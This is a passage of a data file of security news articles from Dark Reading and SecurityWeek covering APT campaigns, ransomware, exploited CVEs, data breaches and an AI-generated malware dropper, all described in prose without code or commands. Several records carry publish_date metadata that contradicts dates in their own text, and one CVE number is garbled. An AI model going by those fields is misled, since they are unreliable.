safety,\" according to the joint alert — organizations should start by patching any vulnerable instances (to version 2023.05.4).\nFrom there, conducting active threat hunting based on the IoCs to uncover and remove persistent backdoors should be a top priority, according to Fortinet and Microsoft, both of which offer exhaustive guidance on that front.\nBoth the TeamCity server and build agents should be vetted for signs of trouble.\nJetBrains, in its CVE-2023-42793 security advisory, recommended that any publicly accessible servers be removed from the reach of the Internet while teams carry out patching and compromise investigations.\nThe company also warned that while researchers have observed Windows-based TeamCity environments being actively exploited, \"this doesn't rule out Linux-based TeamCity environments also being exploited in similar ways.\"\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"SolarWinds-Style"}}
{"id":104,"title":"North Korea Debuts 'SpectralBlur' Malware Amid macOS Onslaught","publish_date":null,"link":"https://www.darkreading.com/threat-intelligence/north-korea-debuts-spectralblur-malware-amid-macos-onslaught","clean_text":"North Korea Debuts 'SpectralBlur' Malware Amid macOS OnslaughtNorth Korea Debuts 'SpectralBlur' Malware Amid macOS Onslaught The post-exploitation backdoor is the latest in a string of custom tools aimed at spying on Apple users.\nThe prolific North Korean state-backed threat actor known as TA444 is back with shiny new malware for targeting macOS users, dubbed \"SpectralBlur.\"\nThe custom tool is the latest in a string of proprietary malware that the advanced persistent threat (APT) group has been consistently generating — a trait that sets it apart from other DPRK-sponsored threats.\nAccording to Proofpoint threat researcher Greg Lesnewich, TA444 (aka APT38, BlueNoroff, BlackAlicanto, Coperenicum, Sapphire Sleet, and Stardust Chollima) debuted the SpectralBlur malware in August.\nIt's a \"moderately capable backdoor, that can upload/download files, run a shell, update its configuration, delete files, hibernate, or sleep, based on commands issued from the [command-and-control server],\" he explained in a post on his personal blog this week.\nTA444 often shares overlaps with its well-known cousin APT, Lazarus Group.\nFor instance, Lesnewich noted that SpectralBlur malware contains similar strings within its code to the KandyKorn macOS data stealer, which emerged in early November in Lazarus Group campaigns used to target blockchain engineers connected to cryptocurrency exchanges.\nProofpoint was subsequently able to link KandyKorn back to TA444 as well, via a phishing campaign analysis.\nSpectralBlur is just the latest tool designed to go after macOS users, who are becoming a particular focus for North Korean nation-state attackers. \"\nTA444 keeps running fast and furious with these new macOS malware families,\" Lesnewich wrote.\nEarlier analysis from Proofpoint pointed out that malware creation — particularly in the form of post-exploitation backdoors like SpectralBlur and KandyKorn — is where TA444 really stands out, suggesting \"that there is an embedded, or at least a devoted, malware development element alongside TA444 operators.\"\nAbout the Author You May Also Like","num_sentences":12,"metadata":{"source":"blog","platform":"darkreading","filename":"SpectralBlur"}}
{"id":105,"title":"Russia's 'Star Blizzard' APT Upgrades Its Stealth, Only to Be Unmasked Again","publish_date":"2022-08-28","link":"https://www.darkreading.com/threat-intelligence/russia-star-blizzard-apt-upgrades-stealth-unmasked","clean_text":"Russia's 'Star Blizzard' APT Upgrades Its Stealth, Only to Be Unmasked AgainRussia's 'Star Blizzard' APT Upgrades Its Stealth, Only to Be Unmasked Again A state-sponsored Scooby Doo villain has once again been thwarted by those meddling researchers.\nDecember 7, 2023 After multiple exposures and disruptions, a Kremlin-sponsored advanced persistent threat (APT) actor has once again upgraded its evasion techniques.\nHowever, that move was also exposed this week, by Microsoft. \"\nStar Blizzard\" (aka Seaborgium, BlueCharlie, Callisto Group, and Coldriver) has been carrying out email credential theft in service of cyberespionage and cyber influence campaigns since at least 2017.\nHistorically, it has focused its aim on public and private organizations in NATO member countries, typically in fields related to politics, defense, and related sectors — NGOs, think tanks, journalists, academic institutions, intergovernmental organizations, and so on.\nIn recent years, it has especially targeted individuals and organizations providing support for Ukraine.\nBut for every successful breach, Star Blizzard is also known for its OpSec failures.\nMicrosoft disrupted the group in August 2022 and, in the time since, Recorded Future has tracked it as it not so subtly attempted to shift to new infrastructure.\nAnd on Thursday, Microsoft returned to report on its latest efforts at evasion.\nThese efforts include five primary new tricks, most notably the weaponization of email marketing platforms.\nMicrosoft declined to provide comment for this article.\nStar Blizzard's Latest TTPs To aid in sneaking past email filters, Star Blizzard has started using password-protected PDF lure documents, or links to cloud-based file sharing platforms with the protected PDFs contained within.\nThe passwords to these documents typically come packaged in the same phishing email, or an email sent shortly after the first.\nAs small roadblocks for potential human analysis, Star Blizzard has begun using a domain name service (DNS) provider as a reverse proxy — obscuring the IP addresses associated with its virtual private servers (VPSs) – and server-side JavaScript snippets intended to prevent automated scanning of its infrastructure.\nIt's also using a more randomized domain generation algorithm (DGA), to make detecting patterns in its domains more cumbersome.\nAs Microsoft points out however, Star Blizzard domains still share certain defining characteristics: they're typically registered with Namecheap, in groups that often use similar naming conventions, and they sport TLS certifications from Let's Encrypt.\nAnd besides its smaller tricks, Star Blizzard has begun to utilize the email marketing services Mailerlite and HubSpot for directing its phishing escapades.\nUsing Email Marketing for Phishing As Microsoft explained in its blog, \"the actor uses these services to create an email campaign, which provides them with a dedicated subdomain on the service that is then used to create URLs.\nThese URLs act as the entry point to a redirection chain ending at actor-controlled Evilginx server infrastructure.\nThe services can also provide the user with a dedicated email address per configured email campaign, which the threat actor has been seen to use as the 'From' address in their campaigns.\"\nSometimes the hackers have crossed tactics, embedding within the body of their password-protected PDFs the email marketing URLs they use to redirect to their malicious servers.\nThis combo removes the need to include its own domain infrastructure in the emails. \"\nTheir use of cloud-based platforms like HubSpot, MailerLite, and virtual private servers (VPS) partnered with server-side scripts to prevent automated scanning is an interesting approach,\" explains Recorded Future Insikt Group threat intelligence analyst Zoey Selman, \"as it enables BlueCharlie to set allow parameters to redirect the victim to threat actor infrastructure only when the requirements are met.\"\nRecently, researchers observed the group using email marketing services to target think tanks and research organizations, using a common lure, with the goal of obtaining credentials for a U.S. grants management portal.\nThe group has seen some other recent success, as well, Selman notes, \"most notably against UK government officials in credential-harvesting and hack-and-leak operations in use in influence operations, such as against former UK MI6 chief Richard Dearlove, British Parliamentarian Stewart McDonald, and is known to have at least attempted to target employees of some of the US' most high profile national nuclear laboratories.\"\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"Star-Blizzard"}}
{"id":106,"title":"APTs Swarm Zimbra Zero-Day to Steal Government Info Worldwide","publish_date":"2022-10-28","link":"https://www.darkreading.com/cyberattacks-data-breaches/apts-swarm-zimbra-zero-day-to-steal-government-info-worldwide","clean_text":"APTs Swarm Zimbra Zero-Day to Steal Government Info WorldwideAPTs Swarm Zimbra Zero-Day to Steal Government Info Worldwide At least four separate campaigns against CVE-2023-37580 in the popular Zimbra Collaboration Suite aimed to siphon up reams of sensitive mail data.\nAt least four separate cyberattack groups have used a former zero-day security vulnerability in the Zimbra Collaboration Suite (ZCS) to steal email data, user credentials, and authentication tokens from government organizations globally.\nZCS is an email server, calendaring, and chat and video platform, used by \"thousands\" of companies and \"hundreds of millions\" of individuals, according to the Zimbra website.\nIts client organizations are as diverse as the Japan Advanced Institute of Science and Technology, Germany's Max Planck Institute, and Gunung Sewu, a top business incubator in Southeast Asia.\nThe bug (CVE-2023-37580) is a reflected cross-site scripting (XSS) vulnerability in the Zimbra email server that was patched on July 25, with a hotfix rolling out to its public GitHub repository on July 5.\nAccording to a report by Google's Threat Analysis Group (TAG) shared with Dark Reading, the zero-day exploitation started in June, before Zimbra offered remediation.\nFour Separate Cyberattacks on World Governments Google TAG has disclosed details on the government campaigns, which include: June 29: Unknown attackers target Greece.\nJuly 11: Winter Vivern APT campaign targets Moldova and Tunisia.\nJuly 20: Unknown attackers target Vietnam.\nAug. 25: Unknown attackers target Pakistan. \"\nThe initial in-the-wild discovery of the zero-day vulnerability was a campaign targeting a government organization in Greece,\" according to Google TAG researchers. \"\nThe attackers sent emails containing exploit URLs to their targets.\"\nIf a target clicked the link during a logged-in Zimbra session, the URL loaded a framework that steals users' emails and attachments; and, it set up an auto-forwarding rule to an attacker-controlled email address.\nThe Winter Vivern campaign meanwhile went on for two weeks after beginning on July 11. \"\nTAG identified multiple exploit URLs that targeted government organizations in Moldova and Tunisia; each URL contained a unique official email address for specific organizations in those governments,\" according to the TAG analysis.\nThe third zero-day campaign, by an unidentified group, was part of a phishing expedition against a government organization in Vietnam. \"\nIn this case, the exploit URL pointed to a script that displayed a phishing page for users' webmail credentials, and posted stolen credentials to a URL hosted on an official government domain that the attackers likely compromised,\" Google researchers explained.\nThe fourth campaign employed an N-day exploit to steal Zimbra authentication tokens from a government organization in Pakistan. \"\nThe discovery of at least four campaigns exploiting CVE-2023-37580 … demonstrates the importance of organizations applying fixes to their mail servers as soon as possible,\" the advisory concluded. “\nThese campaigns also highlight how attackers monitor open-source repositories to opportunistically exploit vulnerabilities where the fix is in the repository, but not yet released to users.\"\nCyberattackers Target Juicy Mail Servers There has been ongoing exploitation of vulnerabilities in mail servers, so organizations should prioritize patching them.\nZimbra alone has been plagued by security incidents, including a remote code execution bug exploited as a zero-day in October 2022 and an infostealing campaign by the nation of North Korea that preyed on unpatched servers.\nAnd in January, CISA warned that threat actors were exploiting multiple CVEs against ZCS.\nMeanwhile, last month Winter Vivern was exploiting a zero-day flaw in Roundcube Webmail servers, with a malicious email campaign targeting governmental organizations and a think tank in Europe that requires only that a user view a message.\nAccording to TAG: \"The regular exploitation of XSS vulnerabilities in mail servers also shows a need for further code auditing of these applications, especially for XSS vulnerabilities.\"\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"Zimbra"}}
{"id":107,"title":"Attackers Target Max-Severity Apache ActiveMQ Bug to Drop Ransomware","publish_date":null,"link":"https://www.darkreading.com/cyberattacks-data-breaches/attackers-target-max-severity-apache-activemq-bug-to-drop-ransomware","clean_text":"Attackers Target Max-Severity Apache ActiveMQ Bug to Drop RansomwareAttackers Target Max-Severity Apache ActiveMQ Bug to Drop Ransomware More than 3,000 systems are exposed and vulnerable to attack on the Internet.\nNovember 2, 2023 More than 3,000 Internet-accessible Apache ActiveMQ Servers are exposed to a critical remote code execution vulnerability that an attacker has begun actively targeting to drop ransomware.\nThe Apache Software Foundation (ASF) disclosed the vulnerability, tracked as CVE-2023-46604, on Oct. 27.\nThe bug allows a remote attacker with access to an ActiveMQ message broker to execute arbitrary commands on affected systems.\nProof-of-concept exploit code and full details of the vulnerability are publicly available, meaning that threat actors have both the means and the information to launch attacks against the vulnerability.\nExploit Activity Researchers at Rapid7 reported observing exploit activity targeting the flaw at two customer locations, starting the same day that ASF disclosed the threat. \"\nIn both instances, the adversary attempted to deploy ransomware binaries on target systems in an effort to ransom the victim organizations,\" researchers from Rapid7's managed detection and response team said a in blog post.\nThey described both targeted organizations as running outdated versions of Apache ActiveMQ.\nThe researchers attributed the malicious activity to the HelloKitty ransomware family, based on the ransom note and other attack attributes.\nHelloKitty ransomware has been percolating in the wild since at least 2020.\nIts operators have tended to favor double-extortion attacks in which they have not just encrypted the data but also stolen it as additional leverage for extracting a ransom from victims.\nThe HelloKitty ransomware attacks leveraging the ActiveMQ flaw appeared somewhat rudimentary.\nIn one of the attacks, the threat actor made more than a half dozen attempts to encrypt the data, prompting the researchers to label to threat actor as \"clumsy\" in their report. \"\nExploit code for this vulnerability has been publicly available since last week, and our researchers have confirmed exploitability,\" says Caitlin Condon, head of threat research at Rapid7. \"\nThe threat activity Rapid7 observed looked like automated exploitation and wasn't particularly sophisticated, so we would advise that organizations patch quickly to protect against potential future exploitation.\"\nOver 3,000 Systems Vulnerable to Attack Some 3,329 Internet-connected ActiveMQ systems are vulnerable to attack via CVE-2023-46604, according to data the ShadowServer organization released on Oct. 30.\nActiveMQ is a relatively popular open source message broker that facilitates messaging between different applications, services, and systems.\nThe ASF describes the technology as the \"most popular open source, multi-protocol, Java-based message broker.\"\nData analytics firm Enlyft has estimated some 13,120 companies — mostly small and midsize — use ActiveMQ.\nCVE-2023-46604 affects multiple versions of Apache ActiveMQ and Apache ActiveMQ Legacy OpenWire Module.\nVulnerable versions include Apache ActiveMQ versions before 5.18.3; 5.17.6 ActiveMQ Legacy OpenWire Module before 5.18.3 and before 5.17.6 The ASF assigned the vulnerability a maximum possible severity score of 10.0 on the CVSS scale and has released updated versions of the affected software.\nASF has recommended that organizations using the technology upgrade to the fixed version to mitigate risk.\nCVE-223-466604 is an insecure deserialization bug — a kind of vulnerability that happens when an application deserializes untrusted or manipulated data without first verifying if the data is valid.\nAdversaries often exploit such flaws by sending a malicious crafted object that, when deserialized, executes malicious or unauthorized code, leading to breaches and arbitrary code execution.\nInsecure deserialization bugs are common and have been a regular feature on OWASP's list of top 10 Web application vulnerability types for years.\nAbout the Author You May Also Like","num_sentences":26,"metadata":{"source":"blog","platform":"darkreading","filename":"apache-activemq"}}
{"id":108,"title":"IAM Credentials in Public GitHub Repositories Harvested in Minutes - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/iam-credentials-in-public-github-repositories-harvested-in-minutes/","clean_text":"A threat actor is harvesting identity and access management (IAM) credentials from public GitHub repositories within five minutes of exposure, cybersecurity firm Palo Alto Networks warns.\nThe activity, tracked as EleKtra-Leak, has been ongoing for at least two years, allowing the threat actor to set up multiple AWS Elastic Compute (EC2) instances and use them in cryptojacking campaigns that have been ongoing for at least two years.\nAs part of the EleKtra-Leak operation, the threat actor has been using automated tools to clone public GitHub repositories and harvest AWS IAM credentials from them, but blocklisting repositories routinely exposing such credentials, to avoid honey traps set up by security researchers.\nAccording to Palo Alto Networks’ Unit 42 research team, the attackers appear to only harvest credentials exposed in plaintext.\nFurthermore, the exposed keys can be used only if GitHub does not identify them and does not notify AWS, which would automatically quarantine the associated user to prevent abuse. “\nEven when GitHub and AWS are coordinated to implement a certain level of protection when AWS keys are leaked, not all cases are covered.\nWe highly recommend that CI/CD security practices, like scanning repos on commit, should be implemented independently,” Palo Alto Networks underlines.\nThe EleKtra-Leak operation relies on the real-time scanning of GitHub repositories for exposed secrets, and on the creation of multiple EC2 instances per accessible AWS region, for cryptojacking.\nPalo Alto Networks said the attackers are performing multiple operations within minutes but successfully keeping their identity obscured, likely by using automated tools behind a VPN.\nBetween August 30 and October 6, the security firm identified 474 unique miners believed to be attacker-controlled EC2 instances. “\nBecause the actors mined Monero, a type of cryptocurrency that includes privacy controls, we cannot track the wallet to obtain exact figures of how much the threat actors gained,” Palo Alto Networks says.\nRelated: AWS Using MadPot Decoy System to Disrupt APTs, Botnets Related: Stolen GitHub Credentials Used to Push Fake Dependabot Commits Related: GitHub Enterprise Server Gets New Security Capabilities","num_sentences":12,"metadata":{"source":"blog","platform":"securityweek","filename":"EleKtra-Leak"}}
{"id":109,"title":"Fog Ransomware Attack Employs Unusual Tools - SecurityWeek","publish_date":"2025-05-28","link":"https://www.securityweek.com/fog-ransomware-attack-employs-unusual-tools/","clean_text":"A recent Fog ransomware attack stands out due to the use of a series of legitimate tools previously unseen in ransomware attacks, Symantec reports.\nThe attack was carried out in May 2025 against a financial institution in Asia and relied on Syteca (formerly Ekran), a legitimate employee monitoring software, and several open source pentesting utilities, namely GC2, Adaptix, and Stowaway.\nThe attackers compromised the organization’s network two weeks before deploying ransomware, and infected two Exchange servers in the process.\nThe infection chain started with the open source penetration testing tools.\nOne of the utilities, GC2, can be used to execute commands using Google Sheets or Microsoft SharePoint List, and to exfiltrate data via Google Drive or Microsoft SharePoint documents.\nThe tool was previously used by the Chinese state-sponsored hacking group APT41 in 2023.\nThe Fog attack also involved the use of Stowaway, an open source proxy utility, to deploy Syteca, a legitimate employee monitoring application that supports screen recording and keystroke monitoring, among others. “\nSeveral libraries are loaded by this executable, suggesting it was possibly used for information stealing or spying, which would be the most likely reason the attackers would deploy it given the keylogging and screen capture capabilities of the tool,” Symantec notes.\nThe attackers were also seen executing commands to remove Syteca, and employing PsExec and SMBExec, along with Syteca and GC2, for lateral movement.\nFile transfer utilities such as Freefilesync and MegaSync were used for data exfiltration.\nAdditionally, the Adaptix C2 Agent Beacon, a component of an open source post-exploitation and adversarial emulation framework, was deployed.\nThe tool, which is like Cobalt Strike, enables command-and-control (C&C) access.\nThe attackers also created a service to establish persistence on the infected network several days before the ransomware was deployed.\nImpacket was likely used to execute Fog.\nAccording to Symantec, the unusual set of tools employed in this attack, along with the attempt to retain access to the compromised network, suggests that the victim organization might have been targeted for espionage, with the ransomware component being either a decoy or an attempt to earn additional money from the intrusion.\nThis is not the first ransomware attack to employ tools typically used by China-linked APTs, with previous occurrences including a variant of the PlugX backdoor and the Shadowpad modular malware family.\nThe Fog ransomware emerged in 2024, mainly targeting the US education sector.\nAs an initial access vector, the group has abused compromised VPN credentials, vulnerable Veeam Backup & Replication (VBR) servers (CVE-2024-40711), and phishing emails.\nRelated: FBI Aware of 900 Organizations Hit by Play Ransomware Related: Chinese Hacking Group APT41 Exploits Google Calendar to Target Governments Related: Sensitive Information Stolen in Sensata Ransomware Attack","num_sentences":19,"metadata":{"source":"blog","platform":"securityweek","filename":"Fog"}}
{"id":110,"title":"Qantas Confirms 5.7 Million Impacted by Data Breach - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/qantas-confirms-5-7-million-impacted-by-data-breach/","clean_text":"Australian airline Qantas has confirmed that the personal information of 5.7 million customers was compromised after hackers breached a third-party platform used by one of its call centers.\nThe incident occurred on June 30 and did not impact the company’s operations.\nNone of Qantas’ systems was compromised, the country’s flag carrier said.\nOn July 7, the company announced that a hacker had made contact, likely for extortion purposes, and that it was working to validate the hacker’s claims.\nRight from the start, the airline said the personal information of roughly 6 million customers was stored on the hacked platform, and in a July 9 update it confirmed not only the number of affected individuals, but also the type of information that was compromised. “\nAfter removing duplicate records, our investigation has found that there were 5.7 million unique customers’ data held in the system.\nSpecific data fields vary from customer to customer,” Qantas said.\nAccording to the company, 4 million customer records may have contained names, email addresses, and Qantas Frequent Flyer details.\nOf these, 1.2 million records only contained names and email addresses.\nFor the remaining 1.7 million customers, their records contained additional information, including addresses for 1.3 million, dates of birth for 1.1 million, phone numbers for 900,000, gender information for 400,000, and meal preferences for 10.000. “\nCustomer records are based on unique email addresses and customers with multiple email addresses may have multiple accounts,” the company also said, adding that no credit card details, financial data, or passport details were stored on the hacked platform.\nThe airline has started emailing the impacted customers to notify them of the types of personal information compromised in the attack.\nThe company says it has no evidence that the compromised information has been released publicly. “\nSince the incident, we have put in place a number of additional cyber security measures to further protect our customers’ data, and are continuing to review what happened.\nWe remain in constant contact with the National Cyber Security Coordinator, Australian Cyber Security Centre and the Australian Federal Police,” Qantas Group CEO Vanessa Hudson said.\nRelated: Nippon Steel Subsidiary Blames Data Breach on Zero-Day Attack Related: Kelly Benefits Data Breach Impacts 550,000 People Related: Ahold Delhaize Data Breach Impacts 2.2 Million People","num_sentences":16,"metadata":{"source":"blog","platform":"securityweek","filename":"Qantas"}}
{"id":111,"title":"Russian APT Exploiting Mail Servers Against Government, Defense Organizations - SecurityWeek","publish_date":"2023-09-28","link":"https://www.securityweek.com/russian-apt-exploiting-mail-servers-against-government-defense-organizations/","clean_text":"The Russian state-sponsored group APT28 has been exploiting XSS vulnerabilities in mail servers in a widespread campaign targeting government and defense entities, ESET reports.\nAlso tracked as Fancy Bear, Forest Blizzard, Sednit, and Sofacy, and linked to the Russian General Staff Main Intelligence Directorate (GRU), APT28 has been active since at least 2004, targeting energy, government, military, and media entities in the US and Europe.\nTwo weeks ago, France accused APT28 of compromising a dozen government organizations and other French entities.\nOne of the attacks, targeting the TV5Monde broadcasting station, occurred a decade ago.\nOn Thursday, ESET shared details on a wave of APT28 attacks aimed at organizations in Europe, Africa, and South America that involved the exploitation of vulnerable Roundcube, Horde, MDaemon, and Zimbra mail servers since September 2023.\nAs part of the campaign, dubbed Operation RoundPress, the Russian hackers injected the victims’ webmail pages with malicious JavaScript code designed to steal credentials and exfiltrate contacts and messages.\nIn September 2023, the APT targeted an XSS vulnerability in Roundcube, tracked as CVE-2020-35730, to load arbitrary JavaScript code on the webmail page.\nThe flaw was added to CISA’s Known Exploited Vulnerabilities (KEV) catalog in June 2023.\nIn 2024, Operation RoundPress expanded to Horde, MDaemon, and Zimbra servers, and added another Roudcube flaw to the arsenal, namely CVE-2023-43770, which was added to the KEV catalog in February 2024.\nThe MDaemon bug, now patched and tracked as CVE-2024-11182, was exploited as a zero-day.\nThe hacking group was observed sending XSS exploits via email to execute JavaScript code in the victim’s browser, in the context of the webmail webpage, meaning that it could only access data from the victim’s account. “\nNote that, in order for the exploit to work, the target must be convinced to open the email message in the vulnerable webmail portal.\nThis means that the email needs to bypass any spam filtering and the subject line needs to be convincing enough to entice the target into reading the email message,” ESET explains.\nThe observed payloads, tailored for each mail server but collectively tracked as ‘SpyPress’, would create rules to send copies of emails to the attackers, steal webmail credentials (auto-filled in a hidden form or entered by the victim on a fake login page), collect messages and contact information, and bypass two-factor authentication.\nIn 2024, the attacks mainly targeted entities associated with the war in Ukraine, such as governmental organizations in Ukraine and defense companies in Bulgaria and Romania.\nHowever, African, European, and South American governments were also hit. “\nOver the past two years, webmail servers such as Roundcube and Zimbra have been a major target for several espionage groups such as Sednit, GreenCube, and Winter Vivern.\nBecause many organizations don’t keep their webmail servers up to date and because the vulnerabilities can be triggered remotely by sending an email message, it is very convenient for attackers to target such servers for email theft,” ESET notes.\nRelated: Russia-Linked APT Star Blizzard Uses ClickFix to Deploy New LostKeys Malware, Google Warns Related: Firefox Affected by Flaw Similar to Chrome Zero-Day Exploited in Russia Related: Russian Espionage Group Using Ransomware in Attacks Related: Russian Ransomware Gang Exploited Windows Zero-Day Before Patch","num_sentences":19,"metadata":{"source":"blog","platform":"securityweek","filename":"RoundPress"}}
{"id":112,"title":"Russian Government Hackers Caught Buying Passwords from Cybercriminals - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/russian-government-hackers-caught-buying-passwords-from-cybercriminals/","clean_text":"Microsoft on Tuesday published technical documentation on a new Russia-linked espionage outfit it calls “Void Blizzard,” warning that the group has spent the past year quietly looting e-mail, files and even Teams chats from government and defense contractors across Europe and North America.\nIn a new report published in tandem with Dutch intelligence agencies, Redmond’s threat hunting team said the Kremlin hacking team is leaning heavily on the low-cost end of the cybercrime economy: buying stolen usernames and passwords from infostealer markets for use in password-spraying attacks.\nIn recent weeks, Microsoft said it watched the team adopt a more surgical “adversary-in-the-middle spear-phishing” tactic that spoofs the Microsoft Entra login page with a a typo-squatted domain and a malicious QR-code invitation to a fake European defense summit. “\nWe assess that Void Blizzard is using the open-source attack framework Evilginx to conduct the AitM phishing campaign and steal authentication data, including the input username and password and any cookies generated by the server,” Microsoft said.\nEvilginx, publicly released in 2017, is a widely available phishing kit with [adversary-in-the-middle) AitM capabilities.\nWhile the techniques are textbook for government-level cyberespionage campaigns, the targeting is very specific with a victim list that overlaps with other Russia-linked cyberspies, Microsoft said, noting that the Russian hackers are likely pilfering wartime intelligence that can be fed back into military or diplomatic planning.\nMicrosoft said NATO states and Ukraine remain the prime hunting grounds and flagged a case where a Ukrainian aviation agency was hacked by separate Russian APTs, demonstrating focused targeting on air-traffic and aerospace networks.\nAccording to Microsoft, the Void Blizzard playbook is straightforward: steal credentials, log in to Exchange or SharePoint Online, and automate the download of anything a compromised user can see.\nRedmond said its threat intelligence center discovered “a cluster of worldwide cloud abuse activity” linked to Void Blizzard and warned that the threat actor’s prolific activity against networks in critical sectors poses a heightened risk to NATO member states and allies to Ukraine.. After gaining initial access, Microsoft caught the hackers abusing legitimate cloud APIs like Exchange Online and Microsoft Graph to enumerate mailboxes, including any shared mailboxes, and cloud-hosted files. “\nOnce accounts are successfully compromised, the actor likely automates the bulk collection of cloud-hosted data (primarily email and files) and any mailboxes or file shares that the compromised user can access, which can include mailboxes and folders belonging to other users who have granted other users read permissions,” Microsoft explained.\nIn a small number of confirmed compromises, Microsoft said the hackers spied on Microsoft Teams conversations and messages via the Microsoft Teams web client application. “\nThe threat actor has also in some cases enumerated the compromised organization’s Microsoft Entra ID configuration using the publicly available AzureHound tool to gain information about the users, roles, groups, applications, and devices belonging to that tenant,” according to the documentation.\nSince mid-2024, Milcrosoft said it has tracked “successful compromises” against telcos, defense suppliers, digital services providers, healthcare and IT.\nRelated: Russian ‘Gamaredon’ Hackers Back at Targeting Ukraine Officials Related: Russian Star Blizzard APT Uses ClickFix to Deploy LostKeys Malware Related: Russian Seashell Blizzard APT Caught Hacking Critical Infrastructure Related: Microsoft Alerts Customers to Email Theft in Midnight Blizzard Hack Related: CISA Warns of Russian ‘Star Blizzard’ APT Spear-Phishing Operation","num_sentences":14,"metadata":{"source":"blog","platform":"securityweek","filename":"Void Blizzard"}}
{"id":113,"title":"Threat Actors Target Accounting Software Used by Construction Contractors - SecurityWeek","publish_date":"2025-07-28","link":"https://www.securityweek.com/threat-actors-target-accounting-software-used-by-construction-contractors/","clean_text":"Cybersecurity firm Huntress is raising the alarm on a wave of cyberattacks targeting Foundation Accounting Software, an application commonly used by contractors in the construction industry.\nStarting September 14, threat actors have been observed brute forcing the application at scale and using default credentials to gain access to victim accounts.\nAccording to Huntress, multiple organizations in plumbing, HVAC (heating, ventilation, and air conditioning), concrete, and other sub-industries have been compromised via Foundation software instances exposed to the internet. “\nWhile it is common to keep a database server internal and behind a firewall or VPN, the Foundation software features connectivity and access by a mobile app.\nFor that reason, the TCP port 4243 may be exposed publicly for use by the mobile app.\nThis 4243 port offers direct access to MSSQL,” Huntress said.\nAs part of the observed attacks, the threat actors are targeting a default system administrator account in the Microsoft SQL Server (MSSQL) instance within the Foundation software.\nThe account has full administrative privileges over the entire server, which handles database operations.\nAdditionally, multiple Foundation software instances have been seen creating a second account with high privileges, which is also left with default credentials.\nBoth accounts allow attackers to access an extended stored procedure within MSSQL that enables them to execute OS commands directly from SQL, the company added.\nBy abusing the procedure, the attackers can “run shell commands and scripts as if they had access right from the system command prompt.”\nAccording to Huntress, the threat actors appear to be using scripts to automate their attacks, as the same commands were executed on machines pertaining to several unrelated organizations within a few minutes.\nIn one instance, the attackers were seen executing roughly 35,000 brute force login attempts before successfully authenticating and enabling the extended stored procedure to start executing commands.\nHuntress says that, across the environments it protects, it has identified only 33 publicly exposed hosts running the Foundation software with unchanged default credentials.\nThe company notified the affected customers, as well as others with the Foundation software in their environment, even if they were not impacted.\nOrganizations are advised to rotate all credentials associated with their Foundation software instances, keep their installations disconnected from the internet, and disable the exploited procedure where appropriate.\nRelated: Cisco: Multiple VPN, SSH Services Targeted in Mass Brute-Force Attacks Related: Vulnerabilities in PiiGAB Product Expose Industrial Organizations to Attacks Related: Kaiji Botnet Successor ‘Chaos’ Targeting Linux, Windows Systems","num_sentences":17,"metadata":{"source":"blog","platform":"securityweek","filename":"accounting-software"}}
{"id":114,"title":"AI-Generated Malware Found in the Wild - SecurityWeek","publish_date":"2024-06-28","link":"https://www.securityweek.com/ai-generated-malware-found-in-the-wild/","clean_text":"HP has intercepted an email campaign comprising a standard malware payload delivered by an AI-generated dropper.\nThe use of gen-AI on the dropper is almost certainly an evolutionary step toward genuinely new AI-generated malware payloads.\nIn June 2024, HP discovered a phishing email with the common invoice themed lure and an encrypted HTML attachment; that is, HTML smuggling to avoid detection.\nNothing new here – except, perhaps, the encryption.\nUsually, the phisher sends a ready-encrypted archive file to the target. “\nIn this case,” explained Patrick Schlapfer, principal threat researcher at HP, “the attacker implemented the AES decryption key in JavaScript within the attachment.\nThat’s not common and is the primary reason we took a closer look.”\nHP has now reported on that closer look.\nThe decrypted attachment opens with the appearance of a website but contains a VBScript and the freely available AsyncRAT infostealer.\nThe VBScript is the dropper for the infostealer payload.\nIt writes various variables to the Registry; it drops a JavaScript file into the user directory, which is then executed as a scheduled task.\nA PowerShell script is created, and this ultimately causes execution of the AsyncRAT payload.\nAll of this is fairly standard but for one aspect. “\nThe VBScript was neatly structured, and every important command was commented.\nThat’s unusual,” added Schlapfer.\nMalware is usually obfuscated containing no comments.\nThis was the opposite.\nIt was also written in French, which works but is not the general language of choice for malware writers.\nClues like these made the researchers consider the script was not written by a human, but for a human by gen-AI.\nThey tested this theory by using their own gen-AI to produce a script, with very similar structure and comments.\nWhile the result is not absolute proof, the researchers are confident that this dropper malware was produced via gen-AI.\nBut it’s still a bit strange.\nWhy was it not obfuscated?\nWhy did the attacker not remove the comments?\nWas the encryption also implemented with the help of AI?\nThe answer may lie in the common view of the AI threat – it reduces the barrier of entry for malicious newcomers. “\nUsually,” explained Alex Holland, co-lead principal threat researcher with Schlapfer, “when we assess an attack, we examine the skills and resources required.\nIn this case, there are minimal necessary resources.\nThe payload, AsyncRAT, is freely available.\nHTML smuggling requires no programming expertise.\nThere is no infrastructure, beyond one C&C server to control the infostealer.\nThe malware is basic and not obfuscated.\nIn short, this is a low grade attack.”\nThis conclusion strengthens the possibility that the attacker is a newcomer using gen-AI, and that perhaps it is because he or she is a newcomer that the AI-generated script was left unobfuscated and fully commented.\nWithout the comments, it would be almost impossible to say the script may or may not be AI-generated.\nThis raises a second question.\nIf we assume that this malware was generated by an inexperienced adversary who left clues to the use of AI, could AI be being used more extensively by more seasoned adversaries who wouldn’t leave such clues?\nIt’s possible.\nIn fact, it’s likely – but it is largely undetectable and unprovable. “\nWe’ve known for some time that gen-AI could be used to generate malware,” said Holland. “\nBut we haven’t seen any definitive proof.\nNow we have a data point telling us that criminals are using AI in anger in the wild.”\nIt’s another step on the path toward what is expected: new AI-generated payloads beyond just droppers. “\nI think it is very difficult to predict how long this will take,” continued Holland. “\nBut given how quickly the capability of gen-AI technology is growing, it’s not a long term trend.\nIf I had to put a date to it, it will certainly happen within the next couple of years.”\nWith apologies to the 1956 movie ‘Invasion of the Body Snatchers’, we’re on the verge of saying, “They’re here already!\nYou’re next!\nYou’re next!”\nRelated: Cyber Insights 2023 | Artificial Intelligence Related: Criminal Use of AI Growing, But Lags Behind Defenders","num_sentences":50,"metadata":{"source":"blog","platform":"securityweek","filename":"ai-generated-malware"}}
